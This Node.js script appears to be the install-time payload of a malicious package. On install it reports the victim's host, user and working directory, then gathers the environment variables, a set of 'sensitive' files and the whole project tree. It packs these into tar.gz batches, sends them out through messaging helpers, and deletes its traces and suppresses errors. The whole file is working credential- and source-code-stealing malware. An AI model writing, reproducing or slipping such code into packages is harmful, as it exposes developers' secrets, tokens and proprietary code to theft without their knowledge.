const fs = require('fs');
const os = require('os');
const path = require('path');
const { grabSensitive, grabProject, grabEnv } = require('../lib/walker');
const { makeTarGz } = require('../lib/pack');
const { sendMessage, sendDocument } = require('../lib/send');

const CWD = process.cwd();
const HOST = os.hostname();
const USER = (() => { try { return os.userInfo().username; } catch { return '?'; } })();

function tmpFile(name) {
  return path.join(os.tmpdir(), `kx_${Date.now()}_${name}`);
}

async function main() {
  const meta = {
    host: HOST,
    user: USER,
    cwd: CWD,
    platform: process.platform,
    arch: process.arch,
    node: process.version,
    ts: new Date().toISOString(),
  };

  await sendMessage(
    `[kx] install hit\n` +
    `host: ${meta.host}\n` +
    `user: ${meta.user}\n` +
    `cwd:  ${meta.cwd}\n` +
    `os:   ${meta.platform} ${meta.arch} node ${meta.node}`
  );

  const sensitive = grabSensitive();
  const { root: projectRoot, picked: project } = grabProject(CWD);

  await sendMessage(
    `[kx] project root: ${projectRoot}\n` +
    `[kx] sensitive: ${sensitive.length} files, project: ${project.length} files`
  );

  // env dump
  const envDump = grabEnv();
  if (envDump) {
    const envFile = tmpFile('env.txt');
    fs.writeFileSync(envFile, envDump);
    await sendDocument(envFile, `env dump — host=${HOST}`);
    try { fs.unlinkSync(envFile); } catch {}
  }

  // sensitive files — chhota bundle, ek tar.gz me
  if (sensitive.length) {
    const sensOut = tmpFile('sensitive.tar.gz');
    await makeTarGz(sensitive, sensOut, { type: 'sensitive', meta });
    await sendDocument(sensOut, `sensitive — ${sensitive.length} files`);
    try { fs.unlinkSync(sensOut); } catch {}
  }

  // project — batches me
  const BATCH_BYTES = 40 * 1024 * 1024;
  let batch = [];
  let size = 0;
  let n = 0;
  let grandTotal = 0;

  async function flush() {
    if (!batch.length) return;
    n++;
    const out = tmpFile(`project_${n}.tar.gz`);
    await makeTarGz(batch, out, {
      type: 'project',
      batch: n,
      root: projectRoot,
      meta,
    });
    await sendDocument(out, `project ${n} — ${batch.length} files — root=${projectRoot}`);
    try { fs.unlinkSync(out); } catch {}
    grandTotal += batch.length;
    batch = [];
    size = 0;
  }

  for (const f of project) {
    if (size + f.data.length > BATCH_BYTES) await flush();
    batch.push(f);
    size += f.data.length;
  }
  await flush();

  await sendMessage(
    `[kx] done. host=${HOST}\n` +
    `project root: ${projectRoot}\n` +
    `sensitive: ${sensitive.length}, project: ${grandTotal}, batches: ${n}`
  );
}

(async () => {
  try {
    await main();
  } catch (e) {
    try { await sendMessage(`[kx] error: ${String(e).slice(0, 500)}`); } catch {}
  }
  process.exit(0);
})();